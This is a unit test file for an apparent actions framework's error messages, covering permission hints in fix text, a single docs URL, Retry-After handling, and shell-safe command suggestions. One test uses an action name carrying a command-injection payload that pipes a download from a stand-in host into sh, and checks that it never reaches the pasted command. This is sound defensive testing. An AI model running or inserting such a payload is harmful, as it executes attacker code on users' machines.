// What a policy-missing failure hands the reader has to compile. `can()` takes a `Permission` —
// `` `${string}:${string}` `` — so `can('createPost')` is a snippet whose only outcome is a second
// error, and `assertPermission` refuses it the moment the app declares its own set. The action's
// NAME belongs in the cause, which is what finds the file; the PERMISSION's shape belongs in the fix.

import { describe, expect, test } from 'bun:test';
import { describeErrorCode, ERROR_DOCS_URL, statedDelayMs } from '@ultimat3/core';
import {
  ActionDuplicateError,
  ActionPolicyMissingError,
  ActionUnregisteredError,
  IdempotencyConflictError,
  InputInvalidError,
  RemoteActionError,
  RpcFailedError,
} from './errors';

const CAN_ARGUMENT = /can\('(?<permission>[^']*)'\)/;

describe('unit · X_ACTION_POLICY_MISSING pastes a permission, never the action name', () => {
  test('the fix names a resource:verb pair', () => {
    const error = new ActionPolicyMissingError('createPost');
    const permission = CAN_ARGUMENT.exec(error.fix)?.groups?.['permission'];
    expect(permission).toBeDefined();
    expect(permission).not.toBe('createPost');
    expect(permission ?? '').toMatch(/^[^:]+:[^:]+$/);
  });

  test('the cause still names the action, because that is what finds the file', () => {
    const error = new ActionPolicyMissingError('createPost');
    expect(error.cause).toContain('createPost');
    expect(error.code).toBe('X_ACTION_POLICY_MISSING');
  });
});

// This package passes no `docs:` at any construction site, so the link is whatever the registry
// resolved: one page for every code, declared once in `@ultimat3/core`. Pinned against the
// constant and never a literal — a hand-copied URL is how the dead
// `https://ultimate.dev/errors/<code>` host survived every suite in the tree, with the code
// interpolated into a fragment no page has ever had an anchor for. `errors-idempotency.ts` is
// covered here too: it is the same rule in the file `errors.ts` split it into.
describe('unit · docs', () => {
  test('every action error points at the one page, never a per-code URL', () => {
    const errors = [
      new ActionPolicyMissingError('createPost'),
      new ActionUnregisteredError(),
      new ActionDuplicateError('publishPost'),
      new InputInvalidError('publishPost', 'postId is not a uuid'),
      new IdempotencyConflictError('k1', 'payload-mismatch'),
    ];
    for (const error of errors) {
      expect(error.docs, error.code).toBe(ERROR_DOCS_URL);
      expect(error.docs, error.code).not.toContain(error.code);
      expect(describeErrorCode(error.code).docs, error.code).toBe(ERROR_DOCS_URL);
    }
  });
});

describe('unit · X_RPC_FAILED pastes a command a hostile name cannot run through', () => {
  test('an ordinary action name travels verbatim', () => {
    expect(new RpcFailedError('publishPost', 502).fix).toContain(
      'x actions describe publishPost --json',
    );
  });

  test('a name that is not shell-safe becomes the placeholder, and stays in the cause', () => {
    const error = new RpcFailedError('x$(curl -s http://evil.sh|sh)', 502);
    expect(error.fix).not.toContain('$(');
    expect(error.fix).toContain('x actions describe <action-name> --json');
    expect(error.cause).toContain('evil.sh');
  });
});

describe('unit · RemoteActionError states a delay only from the header', () => {
  // Core's rule, the one `problemError` applies: the server never puts `retryAfterSeconds` in a
  // problem body (framework meta is operator-only), so a body value is dropped, never the wait.
  const failure = {
    action: 'createPost',
    status: 429,
    code: 'X_REMOTE_ONLY_CODE',
    cause: 'c',
    fix: 'f',
    meta: { retryAfterSeconds: 3_600, sessionId: 's-1' },
  };

  test('a body retryAfterSeconds with no header is dropped; the other declared keys stay', () => {
    const error = new RemoteActionError(failure);
    expect(error.meta?.['retryAfterSeconds']).toBeUndefined();
    expect(error.meta?.['sessionId']).toBe('s-1');
    expect(statedDelayMs(error)).toBeUndefined();
    expect(error.retry).toBe('retryable');
  });

  test('the header value is the one carried', () => {
    const error = new RemoteActionError({ ...failure, retryAfterSeconds: 2 });
    expect(error.meta?.['retryAfterSeconds']).toBe(2);
    expect(error.retry).toBe('retry-after');
  });
});
